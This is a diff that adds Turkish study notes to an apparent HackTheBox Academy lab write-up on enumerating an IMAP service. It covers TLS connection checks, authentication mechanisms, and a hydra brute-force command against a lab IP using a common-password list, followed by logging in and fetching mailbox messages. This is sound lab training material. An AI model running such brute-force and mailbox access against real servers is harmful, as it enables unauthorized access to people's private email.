@@ -243,3 +243,87 @@ read R BLOCK
 * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4
 
 ```
+# detaylı örnekler ile kullanımı için
+
+
+**imap komutlarının başına a1 1 etc. bişeyler koymalıyız**
+
+1. ## Önce Servisin nasıl çalıştıgını anlayacagız
+
+```bash
+openssl s_client -connect 10.129.202.20:993 -quiet
+```
+bu cıktı bize  Parola bu kanalda açık metin olarak mı gider, yoksa zaten TLS içinde mi taşındığını öğrenicez: `AUTH=PLAIN` olarak gidiyormuş
+
+**Sık görülen seçenekler:**
+
+- **`AUTH=LOGIN`:** Kullanıcı adı ve parolayı ayrı ayrı, yine Base64 ile ister. Önce kullanıcı adı, sonra parola sorulur.
+- **`AUTH=CRAM-MD5`:** Parola ağda açık gitmez. Sunucu bir challenge gönderir, istemci parolayı bu challenge ile hashleyip yanıtlar. Parola ağda hiç görünmez.
+- **`AUTH=XOAUTH2`:** Parola yerine token kullanılır, genelde Gmail veya Outlook gibi servislerde görülür.
+- **`AUTH=GSSAPI` veya `NTLM`:** Kurumsal Windows/Kerberos ortamlarında kullanılır.
+
+**Bizim durumda:** Sunucu yalnızca `AUTH=PLAIN` gösterdiği için, kimlik doğrulama için `AUTHENTICATE PLAIN` veya `LOGIN` komutunu kullanacağız. Hangi yöntemin olduğunu sunucu bize zaten söylüyor, bunu okumak bu CTF'nin de temel becerilerinden biri.
+
+2. ## burada capability yani yeteneklerimizi görmemiz lazım
+
+```bash
+a1 CAPABILITY
+```
+**a1 CAPABILITY * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN a1 OK `Pre-login capabilities listed, post-login capabilities have more`.**
+
++ `IDLE, ENABLE` gibi görünen özellikler, girişten sonra kullanılabilecek daha geniş bir set için bir başlangıç noktası.
+
+3. ## eğer gerçekten command çalıştıramıyorsak bruteforce ile giriş deneyeceğiz
+
+```bash
+hydra -l HTB -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -t 4 imaps://10.129.50.57 -s 993
+```
+4. eğer username ve password bulursak
+
+
+```bash
+openssl s_client -connect 10.129.50.57:993 -quiet
+
+# sonra su şekilde login olacaz
+
+a1 LOGIN username password
+
+```
+5. burada içeride listeleme yapıcaz
+
+```bash
+a2 LIST "" *
+# output 
+* LIST (\HasNoChildren) "." Notes
+* LIST (\HasNoChildren) "." Meetings
+* LIST (\HasNoChildren \UnMarked) "." Important
+* LIST (\HasNoChildren) "." INBOX
+a2 OK List completed (0.005 + 0.000 + 0.004 secs).
+
+```
+5. herhangi bir kutu seçmek için
+
+```bash
+a3 SELECT INBOX
+```
+6. Mesajları listelemek için
+
+```bash
+a4 SEARCH ALL
+# * SEARCH 1 ====> buradaki 1 numarası
+```
+**Dönen numaralar mesajların kimlikleridir. Sonra bir mesajın başlıklarını okuyun. Bütün mesajı okumak yerine önce başlığa bakmak daha az çıktı üretir:**
+
+7. şimdi mesajın içeriğini okuyalım
+
+```bash
+a5 FETCH 1 BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)]
+```
+
+8. mesajın gövdesini kendisini okumak için 
+
+
+
+```bash
+a6 FETCH 1 BODY[TEXT]
+```
